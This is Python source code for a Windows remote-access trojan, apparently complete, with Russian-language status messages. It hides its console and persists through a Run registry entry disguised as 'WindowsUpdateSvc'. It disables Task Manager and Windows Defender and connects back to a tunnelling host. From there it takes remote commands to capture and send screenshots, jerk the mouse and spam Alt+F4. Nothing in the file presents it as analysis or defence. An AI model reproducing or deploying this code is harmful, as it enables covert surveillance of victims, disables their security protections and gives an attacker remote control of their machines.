import socket
import struct
import time
import threading
import subprocess
import os
import sys
import winreg as reg
import mss
import cv2
import numpy as np
import pyautogui

HOST = "hbchy-2a09-bac5-31cc-319--4f-94.run.pinggy-free.link"
PORT = 43831

def hide_console():
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsUpdateSvc", 0, reg.REG_SZ, f'"{exe_path}"')
        reg.CloseKey(key)
    except:
        pass

def disable_protection():
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
    except:
        pass

def send_response(conn, message):
    try:
        data = message.encode('utf-8')
        conn.sendall(struct.pack(">L", len(data)) + data)
    except:
        pass

def execute_command(cmd, conn):
    cmd = cmd.lower().strip()
    try:
        if cmd == "screen":
            with mss.mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                conn.sendall(struct.pack(">L", len(buffer)) + buffer.tobytes())
            send_response(conn, "✅ Скрин отправлен")

        elif cmd == "mousekill":
            pyautogui.FAILSAFE = False
            for _ in range(100):
                pyautogui.moveRel(60, 0, 0.04)
                pyautogui.moveRel(-60, 0, 0.04)
            send_response(conn, "🖱️ MouseKill активирован")

        elif cmd == "altf4":
            for _ in range(25):
                pyautogui.hotkey('alt', 'f4')
                time.sleep(0.3)
            send_response(conn, "⌨️ Alt+F4 спам запущен")

        else:
            send_response(conn, f"Команда получена: {cmd}")

    except Exception as e:
        send_response(conn, f"Ошибка: {str(e)}")

def main():
    hide_console()
    add_to_startup()
    disable_protection()

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            while True:
                data = b""
                payload_size = struct.calcsize(">L")
                while len(data) < payload_size:
                    packet = s.recv(4096)
                    if not packet:
                        raise ConnectionResetError
                    data += packet

                msg_size = struct.unpack(">L", data[:payload_size])[0]
                command = data[payload_size:payload_size + msg_size].decode('utf-8', errors='ignore')

                threading.Thread(target=execute_command, args=(command, s), daemon=True).start()

        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
